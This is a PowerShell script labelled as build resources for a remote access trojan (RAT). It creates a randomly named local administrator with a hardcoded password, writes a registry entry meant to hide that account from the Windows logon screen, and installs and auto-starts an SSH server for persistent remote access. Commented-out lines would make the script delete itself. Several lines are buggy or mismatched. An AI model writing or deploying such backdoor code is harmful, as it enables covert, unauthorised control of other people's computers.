#build resources for RAT
# Created by : Luke O'Sullivan

#Random string for directorys
function random_text{
    
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})

}
# create's local admin
function create_account {
    [CmdletBidning()]
    param (
        [string] $uname,
        [securestring] $pword
    )
    begin {
    }
    process {
        New-LocalUser "$uname" -pword $pword -FullName "$uname" -Description "Temporary local admin"
        Write-Verbose "$uname local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$uname"
    }
    end {
    }
}
#create admin user
$uname = random_text
$pword = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
create_account -uname $uname -pword $pword

# registry to hide local admin
$registry_name = random_text 
(
    echo Windows Registry Editor Version 5.00
    echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList]
    echo "rat"=dword:00000000 ; ) > "$registry_name.reg"




#cd $env:temp
#$directory_name = random_text
#mkdir $directory_name

## Variables
$wd = random_text


$path = "$env:temp/$wd"
$initial_dir = Get-Location


#enabling persistant ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*

# 

#goto temp and make working directory
mkdir $path
cd $path

# self delete
#cd $initial_dir
#del Installer.ps1